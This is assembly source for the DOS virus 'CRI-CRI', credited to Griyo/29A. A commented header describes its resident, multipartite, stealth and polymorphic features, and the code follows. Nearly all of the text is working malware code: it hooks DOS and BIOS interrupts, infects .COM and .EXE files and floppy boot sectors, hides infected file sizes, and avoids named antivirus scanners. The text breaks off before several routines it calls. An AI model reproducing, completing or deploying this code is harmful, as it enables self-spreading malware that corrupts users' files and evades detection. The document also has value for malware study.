;----------------------------------------------------------------------------
;CRI-CRI ViRuS (CoDe by Griyo/29A)
;----------------------------------------------------------------------------

;ResiDenT:

;WheN an inFecTed FiLe is Run thE viRus becaMes ResidEnt inTo a UMB
;memoRy bloCk (if aVaLiabLe) or in conVenTionaL memOry. Then iT
;hOOks int13h and int21h.

;InfEcTion (MulTiPartite):

;CriCri wRitEs itSeLf to The End of .Com and .Exe fiLes that aRe eXecUtEd 
;or cLosEd aNd to The BooT SectOr of fLoppY diSks tHat are accEsed. During
;fiLe iNfeCtion the viRus UseS LoW LeveL SysTem fiLe tabLe and HookS
;int03h and int24h.
;CriCri doEs not inFect the fiLes thAt havE diGit or V chaRactErs in 
;thEir namEs As weLL as FiLes with toDays DatE and SomE antiVirUs 
;eXecuTablEs. InfEcted fiLes Have 62 seCondS in tHeir tiMe sTamp.

;SteALth (fiLe and booT LeveL):

;CriCri reTurNs cLean CopiEs oF inFected fiLes tHat are acceSed and hide
;theiR tRue siZe. The viRus alSo reTurns the OriGinaL boot sEctoR of
;fLoppy disKs tHat aRe read. The viRus disabLes his sTeaLth mechaNism
;when some comPressiOn uttiLities are beinG eXecuted.

;PoLymorPhic:

;The viRus is polymorPHic in fiLes and bOOt secToRs. GenerAted PolymorPHic
;deCrypToR conTains conDitiOnaL and AbsoluTe jumPs as WeLL as subRoutiNes
;and inteRRupt caLLs.

;----------------------------------------------------------------------------
com     segment para 'CODE'
        assume cs:com,ds:com,es:com,ss:com
;----------------------------------------------------------------------------
;Virus size in bytes
lenvir          equ virus_copy-virus_entry    
;Virus size in para
para_size       equ ((lenvir*02h)+0Fh)/10h
;Virus size in sectors
sector_size     equ ((lenvir+1FFh)/200h)
;Decryptor size in bytes
decryptor       equ (virus_body-virus_entry)
;Boot code size in bytes
boot_size       equ (boot_end-boot_code)
;----------------------------------------------------------------------------
;Create .COM launcher: TASM cricri.asm TLINK /t cricri.obj
        org 100h
;----------------------------------------------------------------------------
;Virus entry point
;----------------------------------------------------------------------------
virus_entry:
;Store bp for launcher
        sub bp,bp
;Buffer were virus build polymorphic decryptor
        db 0280h dup (90h)
virus_body:        
;Save segment registers
        push ds
        push es
;Check if running from boot or file        
        mov al,byte ptr cs:[prog_type][bp]
        cmp al,"B"
        je in_boot_sector
        jmp go_ahead
;----------------------------------------------------------------------------
;Virus working from boot sector
;----------------------------------------------------------------------------
in_boot_sector:
;Reset DOS loaded flag
        mov byte ptr cs:[dos_flag][bp],00h
;Clear dos running switch
        mov byte ptr cs:[running_sw],"R"
;Get int 13h vector
        mov al,13h
        call get_int
;Save old int 13h
        mov word ptr cs:[old13h_off][bp],bx
        mov word ptr cs:[old13h_seg][bp],es
;Calculate our segment position
        mov ax,cs
        sub ax,10h
        mov ds,ax
;Hook int 13h
        mov al,13h
        mov dx,offset my_int13h
        call set_int
;Restore segment registers
        pop es
        pop ds
;Reboot system
        int 19h
;----------------------------------------------------------------------------
;Wait until dos is loaded
;----------------------------------------------------------------------------
wait_dos:
;Hook int 21h at installation check
test_1:
        cmp ah,01h
        jne test_2
        cmp si,00BADh
        jne test_2
        cmp di,0FACEh
        je dos_installed
;Hook int 21h if we detect a write operation
test_2:
        cmp ah,03h
        je dos_installed
        ret
;Hook int 21h to our handler
dos_installed:
        call push_all
;Set dos loaded flag        
        mov byte ptr cs:[dos_flag],0FFh
;Check dos version
        mov ah,30h
        int 21h
        cmp al,04h
        jb exit_wait
;Save old int 21h vector
        mov al,21h
        call get_int
        mov word ptr cs:[old21h_off],bx
        mov word ptr cs:[old21h_seg],es
;Get our segment
        push cs
        pop ds
;Point int 21h to our handler
        mov dx,offset my_int21h
        mov al,21h
        call set_int
exit_wait:
        call pop_all
        ret
;----------------------------------------------------------------------------
;Running from an executable
;----------------------------------------------------------------------------
go_ahead:
;Installation check
        mov si,00BADh
        mov di,0FACEh
        mov ah,01h
        mov dl,80h
        int 13h
        jc not_installed
        cmp si,0DEADh
        jne not_installed
        cmp di,0BABEh
        jne not_installed
        jmp control_end
not_installed:
;Check dos version
        mov ah,30h
        int 21h
        cmp al,04h
        jae check_date
        jmp control_end
check_date:
;Get current date
        mov ah,2Ah
        int 21h
;Save today's date
        mov byte ptr cs:[today][bp],dl
;Activation circunstance: 4th of June
        cmp dh,06h
        jne no_activation
        cmp dl,04h
        jne no_activation
        jmp print_credits
no_activation:
;Set dos loaded flag        
        xor al,al
        dec al
        mov byte ptr cs:[dos_flag][bp],al
;Clear dos running switch
        mov byte ptr cs:[running_sw],"R"
;Save old int 13h
        mov al,13h
        call get_int
        mov word ptr cs:[old13h_seg][bp],es
        mov word ptr cs:[old13h_off][bp],bx
;Save old int 03h
        mov al,03h
        call get_int
        mov word ptr cs:[old03h_seg][bp],es
        mov word ptr cs:[old03h_off][bp],bx
;Save old int 21h
        mov al,21h
        call get_int
        mov word ptr cs:[old21h_seg][bp],es
        mov word ptr cs:[old21h_off][bp],bx
;Redirect traced int 21h to int 03h
        lds dx,dword ptr cs:[old21h][bp]
        mov al,03h
        call set_int
;----------------------------------------------------------------------------
;Memory allocation
;----------------------------------------------------------------------------
        sub di,di
;Get pointer to dos info block
        mov ah,52h
        int 03h
;Get pointer to the dos buffers structure
        lds si,es:[bx+12h]
;Get address of first umb
        mov ax,ds:[si+1Fh]
        cmp ax,0FFFFh
        je no_umbs
;Follow the chain
nextumb:        
        mov ds,ax
;Check for free umb's
        cmp word ptr ds:[di+01h],di
        jnz no_free_umb
;Check if there is enought size
        cmp word ptr ds:[di+03h],para_size+01h
        ja handle_mcb
no_free_umb:
;Check if this is the last umb
        cmp byte ptr ds:[di+00h],"Z"
        je no_umbs
;Jump to next umb in the chain
        mov ax,ds
        inc ax
        add ax,word ptr ds:[di+03h]
        mov ds,ax
        jmp short nextumb
;Allocate memory from last mcb
no_umbs:
;Get pointer to dos info block
        mov ah,52h
        int 03h
;Get pointer to first mcb
        mov ax,es
        dec ax
        mov es,ax
        add bx,12
        lds di,dword ptr es:[bx+00h]
;Follow the mcb chain
nextmcb:
;Check if this is the last mcb
        cmp byte ptr ds:[di+00h],"Z"
        je ok_mcb
;Next mcb
        mov ax,ds
        inc ax
        add ax,word ptr ds:[di+03h]
        mov ds,ax
        jmp short nextmcb
ok_mcb:
;Check mcb size        
        cmp word ptr ds:[di+03h],para_size+4000h
        ja ok_mcb_size
        jmp control_end
ok_mcb_size:        
;Sub top of memory in psp
        sub word ptr ds:[di+12h],para_size+01h
handle_mcb:
;Sub virus size and mcb size
        sub word ptr ds:[di+03h],para_size+01h
;Clear the last mcb field
        mov byte ptr ds:[di+00h],"M"
;Jump to next mcb
        mov ax,ds
        inc ax
        add ax,word ptr ds:[di+03h]
        mov es,ax
        inc ax
        push ax
;Mark mcb as last in the chain
        mov byte ptr es:[di+00h],"Z"
;Set dos as owner
        mov word ptr es:[di+01h],0008h
;Set mcb size
        mov word ptr es:[di+03h],para_size
;Mark UMB as system code
        mov di,0008h
        mov ax,"CS"
        cld
        stosw
        xor ax,ax
        stosw
        stosw
        stosw
;Copy to memory
        pop es
        mov ax,cs
        mov ds,ax
        sub di,di
        mov si,bp        
        add si,0100h
        mov cx,lenvir
        cld
        rep movsb
;Save virus segment
        mov ax,es
        sub ax,10h
        mov ds,ax
;Hook int 13h
        mov dx,offset my_int13h
        mov al,13h
        call set_int
;Hook int 21h
        mov dx,offset my_int21h
        mov al,21h
        call set_int
control_end:
;Restore old int 03h        
        lds dx,dword ptr cs:[old03h][bp]
        mov al,03h
        call set_int
;Return to host
        cmp byte ptr cs:[prog_type][bp],"E"
        je exit_exe
;----------------------------------------------------------------------------
;Exit from .COM
;----------------------------------------------------------------------------
exit_com:
;Restore first three bytes
        mov ax,cs
        mov es,ax
        mov ds,ax
        mov si,offset old_header
        add si,bp 
        mov di,0100h
        mov cx,0003h
        cld
        rep movsb
;Restore segment registers
        pop es
        pop ds
;Check if launcher execution
        cmp bp,0000h
        je endprog
;Get control back to host
        push cs
        mov ax,0100h
        push ax
        call zero_all
        retf
;Exit program if launcher execution
endprog:
        mov ax,4C00h
        int 21h
;----------------------------------------------------------------------------
;Exit from .EXE
;----------------------------------------------------------------------------
exit_exe:
;Restore segment registers
        pop es
        pop ds
;Get control back to host
        mov bx,word ptr cs:[file_buffer+16h][bp]
        mov ax,cs
        sub ax,bx
        mov dx,ax
        add ax,word ptr cs:[old_header+16h][bp]
        add dx,word ptr cs:[old_header+0Eh][bp]
        mov bx,word ptr cs:[old_header+14h][bp]
        mov word ptr cs:[exeret][bp],bx
        mov word ptr cs:[exeret+02h][bp],ax
        mov ax,word ptr cs:[old_header+10h][bp]
        mov word ptr cs:[fix1][bp],dx
        mov word ptr cs:[fix2][bp],ax
        call zero_all
        db 0B8h
fix1:
        dw 0000h
        cli
        mov ss,ax
        db 0BCh
fix2:
        dw 0000h
        sti
        db 0EAh
exeret:
        dw 0000h
        dw 0000h
;----------------------------------------------------------------------------
;Virus int 13h handler
;----------------------------------------------------------------------------
my_int13h:
        cmp byte ptr cs:[dos_flag],00h
        jne ok_dos_flag
        call wait_dos
ok_dos_flag:
        call push_all
;Installation check
        cmp ah,01h
        jnz not_check
        cmp si,00BADh
        jne my13h_exit
        cmp di,0FACEh
        jne my13h_exit
        call pop_all
        mov si,0DEADh
        mov di,0BABEh
        stc
        cmc
        retf 2
not_check:
;Do not use our int 13h handler if we are using our int 21h handler
        cmp byte ptr cs:[running_sw],"R"
        jne my13h_exit
;Check for read operations
        cmp ah,02h
        jne short my13h_exit
;Side 0 of drive a:
        or dx,dx
        jnz short my13h_exit
;Track 0, sector 1
        cmp cx,0001h
        je infect_floppy
;Get control back to old int 13h
my13h_exit:
        call pop_all
        jmp dword ptr cs:[old13h]
;----------------------------------------------------------------------------
;Infect floppy on drive a:
;----------------------------------------------------------------------------
infect_floppy:
;Perform read operation
        pushf
        call dword ptr cs:[old13h]
        jnc boot_read_ok
        call pop_all
        stc
        retf 2
boot_read_ok:
;Check for JMP SHORT at the beginning
        cmp byte ptr es:[bx+00h],0EBh
        jne exit_disk
;Check if infected
        call get_position
        cmp word ptr es:[di+boot_marker-boot_code],"RC"
        jne not_infected
        jmp stealth_boot
not_infected:
;Check for mbr marker also in floppy
        cmp word ptr es:[bx+01FEh],0AA55h
        je floppy_infection
exit_disk:
        call pop_all
        stc
        cmc
        retf 2
;Calculate track and head for floppy
floppy_infection:
;Get sectors per track
        mov ax,word ptr es:[bx+18h]
        mov cx,ax
;Cut one track for virus body
        sub word ptr es:[bx+13h],ax
        mov ax,word ptr es:[bx+13h]
        xor dx,dx
;Divide total sectors by sectors per track
        div cx
        xor dx,dx
;Get heads parameter
        mov cx,word ptr es:[bx+1Ah]
        push cx
;Divide tracks by heads
        div cx
        push ax
        xchg ah,al
        mov cl,06h
        shl al,cl
        or al,01h
;Save virus body position in floopy
        mov word ptr cs:[load_cx],ax
        pop ax
        pop cx
        xor dx,dx
        div cx
        mov byte ptr cs:[load_dh],dl
;Use floppy root directory for old boot sector
        mov cx,000Eh
        mov dx,0100h
;Write original boot sector 
        mov ax,0301h
        pushf
        call dword ptr cs:[old13h]
        jc exit13h_inf
ok_original:
;Move virus loader into boot sector
        push cs
        pop ds
        mov si,offset boot_code
        mov cx,boot_size
        cld
        rep movsb
write_boot:
;Reset disk controler
        xor ax,ax
        pushf
        call dword ptr cs:[old13h]     ;************old13h]
;Write loader
        mov ax,0301h
        xor dx,dx
        mov cx,0001h
        pushf
        call dword ptr cs:[old13h]      ;+++++++++++old13h]
        jnc ok_loader
exit13h_inf:
        call pop_all
        stc
        cmc
        retf 2
ok_loader:
;Set boot flag
        mov byte ptr cs:[prog_type],"B"
;Perform encryption
        call do_encrypt
        push cs
        pop es
;Write virus body
        mov cx,word ptr cs:[load_cx]
        mov dh,byte ptr cs:[load_dh]
        mov bx,offset virus_copy
        mov ax,0300h+sector_size
        pushf
        call dword ptr cs:[old13h]      ;+++++++++++++old13h]        
;Hide changes made to boot sector
stealth_boot:
        call pop_all
        mov cl,03h
        mov al,01h
        mov cl,0Eh
        mov dh,01h
        jmp dword ptr cs:[old13h]
;----------------------------------------------------------------------------
;Code inserted into boot sector
;----------------------------------------------------------------------------
boot_code:
        cli
        xor ax,ax
        mov ss,ax
        mov es,ax
        mov ds,ax
        mov si,7C00h
        mov sp,si
        sti
;Allocate some BIOS memory
        sub word ptr ds:[0413h],(lenvir/512)+1        
        mov ax,word ptr ds:[0413h]
;Calculate residence address
        mov cl,06h
        shl ax,cl
        mov es,ax
;Reset disk
        xor ax,ax
        int 13h
;Get position in disk
;mov cx,XXXXh
        db 0B9h
load_cx dw 0000h
;mov dh,XXh
        db 0B6h
load_dh db 00h
;Prepare for reading virus body
try_again:
        mov ax,0200h+sector_size
;Read at es:bx
        xor bx,bx
;Read virus body into allocated memory        
        int 13h
        jc error_init
;Continue execution on virus body        
        push es
        push bx
        retf
;Error during virus initialization
error_init:
        int 18h
;----------------------------------------------------------------------------
;Infection marker
;----------------------------------------------------------------------------
boot_marker     db "CR"
;End of boot code
boot_end:
;----------------------------------------------------------------------------
;Virus int 21h
;----------------------------------------------------------------------------
my_int21h:
        call push_all
;Set int 21h running switch
        mov byte ptr cs:[running_sw],"F"
;Anti-heuristic function number examination
        xor ax,0FFFFh
        mov word ptr cs:[dos_function],ax
;Save old int 24h
        mov al,24h
        call get_int
        mov word ptr cs:[old24h_seg],es
        mov word ptr cs:[old24h_off],bx
;Hook int 24h to a do-nothing handler
        push cs
        pop ds
        mov dx,offset my_int24h
        mov al,24h
        call set_int
;Save old int 03h
        mov al,03h
        call get_int
        mov word ptr cs:[old03h_seg],es
        mov word ptr cs:[old03h_off],bx
;Hook int 03h to original int 21h
        lds dx,dword ptr cs:[old21h]
        mov al,03h
        call set_int
;Check for special files
        mov ah,51h ;62h?
        int 03h
        dec bx
        mov ds,bx
        mov ax,word ptr ds:[0008h]
        mov byte ptr cs:[stealth_sw],00h
;Check if arj is running        
        cmp ax,"RA"
        je disable_stealth
;Check for pkzip utils        
        cmp ax,"KP"
        je disable_stealth
;Check for lha
        cmp ax,"HL"
        je disable_stealth
;Check for backup        
        cmp ax,"AB"
        je disable_stealth
        jmp no_running
disable_stealth:
        mov byte ptr cs:[stealth_sw],0FFh
no_running:
;Restore and re-save all regs        
        call pop_all
        call push_all
;Put function number into bx
        mov bx,word ptr cs:[dos_function]
;----------------------------------------------------------------------------
;Infection functions
;----------------------------------------------------------------------------
infection_00:
;Exec function
        cmp bx,(4B00h xor 0FFFFh)
        jne infection_01
        jmp dos_exec
infection_01:
;Close file (Handle)
        cmp bh,(3Eh xor 0FFh)
        jne stealth_dos
        jmp dos_close
;----------------------------------------------------------------------------
;Stealth functions
;----------------------------------------------------------------------------
stealth_dos:
;Check if stealth is disabled
        cmp byte ptr cs:[stealth_sw],0FFh
        je m21h_exit
;Open file (Handle)
        cmp bh,(3Dh xor 0FFh)
        jne stealth_00
        jmp dos_open
stealth_00:
;Extended open
        cmp bh,(6Ch xor 0FFh)
        jne stealth_01
        jmp dos_open
stealth_01:
;Directory stealth works with function Findfirst (fcb)
        cmp bh,(11h xor 0FFh)
        jne stealth_02
        jmp ff_fcb
stealth_02:
;Directory stealth works also with function Findnext(fcb)
        cmp bh,(12h xor 0FFh)
        jne stealth_03
        jmp ff_fcb
stealth_03:
;Search stealth works with Findfirst (handle)
        cmp bh,(4Eh xor 0FFh)
        jne stealth_04
        jmp ff_handle
stealth_04:
;Search stealth works also with Findnext (handle)
        cmp bh,(4Fh xor 0FFh)
        jne stealth_05
        jmp ff_handle
stealth_05:
;Read stealth
        cmp bh,(3Fh xor 0FFh)
        jne stealth_06
        jmp dos_read
stealth_06:
;Disinfect if debuggers exec
        cmp bx,(4B01h xor 0FFFFh)
        jne stealth_07
        jmp dos_load_exec
stealth_07:
;Disinfect if file write
        cmp bh,(40h xor 0FFh)
        jne stealth_08
        jmp dos_write
stealth_08:
;Get file date/time        
        cmp bx,(5700h xor 0FFFFh)
        jne stealth_09
        jmp dos_get_time
stealth_09:
;Set file date/time        
        cmp bx,(5701h xor 0FFFFh)
        jne m21h_exit
        jmp dos_set_time
;Get control back to dos
m21h_exit:
;Free int 03h and int 24h
        call unhook_ints
        call pop_all
        jmp dword ptr cs:[old21h]
;----------------------------------------------------------------------------
;Directory stealth with functions 11h and 12h (fcb)
;----------------------------------------------------------------------------
ff_fcb: 
        call pop_all
;Call DOS service
        int 03h
;Save all regs
        call push_all
;Check for errors
        cmp al,255
        je nofound_fcb
;Get current PSP
        mov ah,51h
        int 03h
;Check if call comes from DOS
        mov es,bx
        cmp bx,es:[16h]
        jne nofound_fcb
        mov bx,dx
        mov al,ds:[bx+00h]
        push ax
;Get DTA
        mov ah,2Fh
        int 03h
        pop ax
        inc al
        jnz fcb_ok
        add bx,07h
fcb_ok:
;Check if infected
        mov ax,word ptr es:[bx+17h]
        and al,1Fh
        cmp al,1Fh
        jne nofound_fcb
;Restore seconds
        and byte ptr es:[bx+17h],0E0h
;Restore original file size
        sub word ptr es:[bx+1Dh],lenvir
        sbb word ptr es:[bx+1Fh],0000h
nofound_fcb:
;Restore some registers and return
        call unhook_ints
        call pop_all
        iret
;----------------------------------------------------------------------------
;Search stealth with functions 4Eh and 4Fh (handle)
;----------------------------------------------------------------------------
ff_handle:
        call pop_all
;Call DOS service
        int 03h
        jnc ffhok
        call unhook_ints
        stc
        retf 2
ffhok:
;Save result
        call push_all
;Get DTA
        mov ah,2Fh
        int 03h
;Check if infected
        mov ax,word ptr es:[bx+16h]
        and al,1Fh
        cmp al,1Fh
        jne nofound_handle
;Restore seconds field
        and byte ptr es:[bx+16h],0E0h
;Restore original size
        sub word ptr es:[bx+1Ah],lenvir
        sbb word ptr es:[bx+1Ch],0000h
nofound_handle:
;Restore some registers and exit
        call unhook_ints
        call pop_all
        stc
        cmc
        retf 2
;----------------------------------------------------------------------------
;Load exec
;----------------------------------------------------------------------------
dos_load_exec:
;Open file for read-only
        mov ax,3D00h
        int 03h
        jnc loaded
        jmp m21h_exit
loaded:
        xchg bx,ax
        jmp do_disinfect
;----------------------------------------------------------------------------
;Write file
;----------------------------------------------------------------------------
dos_write:
        call pop_all
        call push_all
do_disinfect:
;Get sft address in es:di
        call get_sft
        jc bad_operation
;Check if file is already infected
        mov al,byte ptr es:[di+0Dh]
        mov ah,1Fh
        and al,ah
        cmp al,ah
        je clear_header
bad_operation:
        jmp load_error
clear_header:
;Save and set file open mode (read/write)
        mov cx,0002h
        xchg cx,word ptr es:[di+02h]
        push cx
;Save and set file attribute
        xor al,al
        xchg al,byte ptr es:[di+04h]
        push ax
;Save and set file pointer position
        push word ptr es:[di+15h]
        push word ptr es:[di+17h]
;Get file true size if write operation
        cmp byte ptr cs:[dos_function+01h],(40h xor 0FFh)
        jne no_size_fix
;Add virus size to file size
        add word ptr es:[di+11h],lenvir
        adc word ptr es:[di+13h],0000h
no_size_fix:
;Point to old header in file
        call seek_end
        sub word ptr es:[di+15h],0019h+01h
        sbb word ptr es:[di+17h],0000h
;Read old header and encryption key
        push cs
        pop ds
        mov ah,3Fh
        mov cx,0019h+01h
        mov dx,offset virus_copy
        int 03h
        jc exit_disin
;Decrypt header
        mov cx,0019h
        push dx
        pop si
        mov al,byte ptr cs:[si+19h]
restore_header:
        xor byte ptr cs:[si+00h],al
        inc si
        loop restore_header
;Write old header
        call seek_begin
        mov dx,offset virus_copy
        mov ah,40h
        mov cx,0019h-01h
        int 03h
;Truncate file
        call seek_end
        sub word ptr es:[di+15h],lenvir
        sbb word ptr es:[di+17h],0000h
        xor cx,cx
        mov ah,40h
        int 03h
exit_disin:
;Restore file pointer position
        pop word ptr es:[di+17h]
        pop word ptr es:[di+15h]
;Restore file attribute 
        pop ax
        mov byte ptr es:[di+04h],al
;Restore file open mode
        pop word ptr es:[di+02h]
;Do not set file date and file time on closing
        or byte ptr es:[di+06h],40h
;Clear seconds field
        and byte ptr es:[di+0Dh],0E0h
load_error:
;Check if write function
        cmp byte ptr cs:[dos_function+01h],(40h xor 0FFh)
        je not_load
;Close file
        mov ah,3Eh
        int 03h
not_load:
        jmp m21h_exit
;----------------------------------------------------------------------------
;Get file date/time
;----------------------------------------------------------------------------
dos_get_time:
        call pop_all
;Call function
        int 03h
        jnc ok_get_time
;Exit if error
        call unhook_ints
        stc
        retf 2
ok_get_time:
        call push_all
;Check if file is already infected        
        mov al,cl
        mov ah,1Fh
        and al,ah
        cmp al,ah
        jne no_get_time
        call pop_all
        and cl,0E0h
        jmp short exit_get_time
no_get_time:
        call pop_all
exit_get_time:
        call unhook_ints
        stc
        cmc
        retf 2
;----------------------------------------------------------------------------
;Set file date/time
;----------------------------------------------------------------------------
dos_set_time:        
        call pop_all
        call push_all        
;Get address of sft entry
        call get_sft        
        jc no_set_time        
;Check if file is already infected        
        mov al,byte ptr es:[di+0Dh]
        mov ah,1Fh
        and al,ah
        cmp al,ah
        je ok_set_time
no_set_time:
;Exit if not infected or error
        jmp m21h_exit
ok_set_time:        
;Perform time change but restore our marker
        call pop_all
        or cl,1Fh
        call push_all
        jmp m21h_exit
;----------------------------------------------------------------------------
;Open file
;----------------------------------------------------------------------------
dos_open:
;Call dos function
        call pop_all
        int 03h
        jnc do_open
open_fail:
        call unhook_ints
        stc
        retf 2
do_open:
        call push_all
;Get sft for file handle
        xchg bx,ax
        call get_sft
        jc no_changes
;Check if file is infected        
        mov al,byte ptr es:[di+0Dh]
        mov ah,1Fh
        and al,ah
        cmp al,ah
        jne no_changes
;If infected stealth true size
        sub word ptr es:[di+11h],lenvir
        sbb word ptr es:[di+13h],0000h
no_changes:
        call unhook_ints
        call pop_all
        stc
        cmc
        retf 2
;----------------------------------------------------------------------------
;Read file
;----------------------------------------------------------------------------
dos_read:
;Restore function entry regs
        call pop_all
        call push_all
;Duplicate handle
        mov ah,45h
        int 03h
        jc no_read_stealth        
        xchg bx,ax
        push ax
;Close new handle in order to update directory entry
        mov ah,3Eh
        int 03h
        pop bx
;Get address of sft entry
        call get_sft        
        jc no_read_stealth        
;Check if file is already infected        
        mov al,byte ptr es:[di+0Dh]
        mov ah,1Fh
        and al,ah
        cmp al,ah
        jne no_read_stealth
;Check and save current offset in file
        mov ax,word ptr es:[di+15h]
        cmp ax,0019h
        jae no_read_stealth
        cmp word ptr es:[di+17h],0000h
        jne no_read_stealth
        mov word ptr cs:[file_offset],ax
        call pop_all
;Save address of read buffer
        mov word ptr cs:[read_off],dx
        mov word ptr cs:[read_seg],ds
;Perform read operation
        int 03h
        jnc check_read
;Error during file read
        call unhook_ints
        stc
        retf 2
no_read_stealth:       
;Exit if no read stealth        
        jmp m21h_exit
check_read:
        call push_all
        call get_sft
;Save offset position
        push word ptr es:[di+15h]
        push word ptr es:[di+17h]
;Save file size
        push word ptr es:[di+11h]
        push word ptr es:[di+13h]
;Add virus size to file size
        add word ptr es:[di+11h],lenvir
        adc word ptr es:[di+13h],0000h
;Point to old header in file
        call seek_end
        sub word ptr es:[di+15h],0019h+01h
        sbb word ptr es:[di+17h],0000h
;Read old header and encryption key
        push cs
        pop ds
        mov ah,3Fh
        mov cx,0019h+01h
        mov dx,offset virus_copy
        int 03h
        jc exit_read
;Decrypt header
        mov cx,0019h
        push dx
        pop si
        mov al,byte ptr cs:[si+19h]
decrypt_header:
        xor byte ptr cs:[si+00h],al
        inc si
        loop decrypt_header
;Move old header into read buffer
        les di,dword ptr cs:[read_ptr]
        mov si,offset virus_copy
        mov cx,0019h-01h
        mov ax,word ptr cs:[file_offset]
        add di,ax
        add si,ax
        sub cx,ax
        cld
        rep movsb
exit_read:
        call get_sft
;Restore file size
        pop word ptr es:[di+13h]
        pop word ptr es:[di+11h]
;Restore old offset in file
        pop word ptr es:[di+17h]
        pop word ptr es:[di+15h]
;Restore regs and exit
        call unhook_ints
        call pop_all
        stc
        cmc
        retf 2
;----------------------------------------------------------------------------
;Infect file at execution ds:dx ptr to filename
;----------------------------------------------------------------------------
dos_exec:
;Open file for read-only
        mov ax,3D00h
        int 03h
        jnc ok_file_open
        jmp file_error
ok_file_open:
        xchg bx,ax
        jmp short from_open
;----------------------------------------------------------------------------
;Infect file at close
;----------------------------------------------------------------------------
dos_close:
        call pop_all
        call push_all
;Duplicate handle
        mov ah,45h
        int 03h
        jc file_error
        xchg bx,ax
        push ax
;Close new handle in order to update directory entry
        mov ah,3Eh
        int 03h
        pop bx
from_open:
;Get sft address in es:di
        call get_sft
        jc file_error
;Check device info word
        mov ax,word ptr es:[di+05h]
;Check if character device handle       
        test al,80h
        jnz file_error
;Check if remote file handle
        test ah,0Fh
        jnz file_error
;Check if file is already infected
        mov al,byte ptr es:[di+0Dh]
        mov ah,1Fh
        and al,ah
        cmp al,ah
        je file_error
;Do not infect files with todays date
        mov al,byte ptr es:[di+0Fh]
        and al,1Fh
        cmp al,byte ptr cs:[today]
        je file_error
;Check file name in sft
        mov cx,0Bh
        mov si,di
name_loop:
;Do not infect files with numbers in their file name
        cmp byte ptr es:[si+20h],"0"
        jb file_name1
        cmp byte ptr es:[si+20h],"9"
        jbe file_error
file_name1:       
;Do not infect files witch name contains v's
        cmp byte ptr es:[si+20h],"V"
        je file_error
;Do not infect files with mo in their name
        inc si
        loop name_loop
;Get first pair
        mov ax,word ptr es:[di+20h]
;Do not infect Thunderbyte antivirus utils        
        cmp ax,"BT"
        je file_error
;Do not infect McAfee's Scan
        cmp ax,"CS"
        je file_error
;Do not infect F-Prot scanner
        cmp ax,"-F"
        je file_error
;Do not infect Solomon's Guard
        cmp ax,"UG"
        jne file_infection
file_error:
        jmp m21h_exit
file_infection:
;Save and set file open mode (read/write)
        mov cx,0002h
        xchg cx,word ptr es:[di+02h]
        push cx
;Save and set file attribute
        xor al,al
        xchg al,byte ptr es:[di+04h]
        push ax
        test al,04h
        jnz system_file
;Save and set file pointer position
        push word ptr es:[di+15h]
        push word ptr es:[di+17h]
        call seek_begin
;Read first 20h bytes 
        push cs
        pop ds
        mov ah,3Fh
        mov cx,0020h
        mov dx,offset file_buffer
        int 03h
;Seek to end of file and get file size
        call seek_end
;Do not infect too small .exe or .com files
        or dx,dx
        jnz ok_min_size
        cmp ax,lenvir+0410h
        jbe exit_inf
ok_min_size:
;Check for .com extension        
        cmp word ptr es:[di+28h],"OC"
        jne no_com
        cmp byte ptr es:[di+2Ah],"M"
        je inf_com
no_com:
;Check for .exe mark in file header
        mov cx,word ptr cs:[file_buffer+00h]
;Add markers M+Z
        add cl,ch
        cmp cl,"Z"+"M"
        jne exit_inf
;Check for .exe extension        
        cmp word ptr es:[di+28h],"XE"
        jne exit_inf
        cmp byte ptr es:[di+2Ah],"E"
        jne exit_inf
        jmp inf_exe
;----------------------------------------------------------------------------
;Exit from file infection
;----------------------------------------------------------------------------
exit_inf:
;Restore file pointer position
        pop word ptr es:[di+17h]
        pop word ptr es:[di+15h]
system_file:          
;Restore file attribute 
        pop ax
        mov byte ptr es:[di+04h],al
;Restore file open mode
        pop word ptr es:[di+02h]
;Do not set file date/time on closing
        or byte ptr es:[di+06h],40h
;Check if close function
        cmp byte ptr cs:[dos_function+01h],(3Eh xor 0FFh)
        je no_close_file
;Close file
        mov ah,3Eh
        int 03h
no_close_file:
        jmp m21h_exit
;----------------------------------------------------------------------------
;Infect .COM file
;----------------------------------------------------------------------------
inf_com:
;Don't infect too big .com files
        cmp ax,0FFFFh-(lenvir+10h)
        jae exit_inf
;Copy header
        call copy_header
;Get file length as entry point
        sub ax,03h
;Write a jump to virus into header
        mov byte ptr cs:[file_buffer+00h],0E9h
        mov word ptr cs:[file_buffer+01h],ax
;Set .com marker 
        mov byte ptr cs:[prog_type],"C"
;Encrypt and infect
        jmp get_control
;----------------------------------------------------------------------------
;Infect .EXE file
;----------------------------------------------------------------------------
inf_exe:       
;Don't infect Windows programs
        cmp word ptr cs:[file_buffer+18h],0040h
        jae bad_exe
;Don't infect overlays
        cmp word ptr cs:[file_buffer+1Ah],0000h
        jne bad_exe
;Check maxmem field
        cmp word ptr cs:[file_buffer+0Ch],0FFFFh
        jne bad_exe
;Save file size
        push ax
        push dx
;Page ends on 0200h boundary
        mov cx,0200h
        div cx
        or dx,dx
        jz no_round_1
        inc ax
no_round_1:
        cmp ax,word ptr cs:[file_buffer+04h]
        jne no_fit_size
        cmp dx,word ptr cs:[file_buffer+02h]
        je header_ok
no_fit_size:
        pop dx
        pop ax
bad_exe:
;Exit if cant infect .exe
        jmp exit_inf
header_ok:
        call copy_header
        pop dx
        pop ax
        push ax
        push dx
        mov cx,10h
        div cx
        sub ax,word ptr cs:[file_buffer+08h]
;Store new entry point
        mov word ptr cs:[file_buffer+14h],dx
        mov word ptr cs:[file_buffer+16h],ax
;Store new stack position
        add dx,lenvir+0410h
        and dx,0FFFEh
        inc ax
        mov word ptr cs:[file_buffer+0Eh],ax
        mov word ptr cs:[file_buffer+10h],dx
;Restore size
        pop dx
        pop ax
;Add virus size to file size
        add ax,lenvir
        adc dx,0000h
;Page ends on 0200h boundary
        mov cx,0200h
        div cx
        or dx,dx
        jz no_round_2
        inc ax
no_round_2:
;Store new size
        mov word ptr cs:[file_buffer+04h],ax
        mov word ptr cs:[file_buffer+02h],dx
;Set .exe marker 
        mov byte ptr cs:[prog_type],"E"
;Encryption an infection continues on next routine
;----------------------------------------------------------------------------
;Encryption and physical infection
;----------------------------------------------------------------------------
get_control:
        call do_encrypt
;Write virus body to the end of file
        mov ah,40h
        mov cx,lenvir
        mov dx,offset virus_copy
        int 03h
        jc no_good_write
;Seek to beginning of file
        call seek_begin
;Write new header
        mov ah,40h
        mov cx,0019h-01h
        mov dx,offset file_buffer
        int 03h
;Mark file as infected
        or byte ptr es:[di+0Dh],1Fh
no_good_write:
;Jump to infection end
        jmp exit_inf        
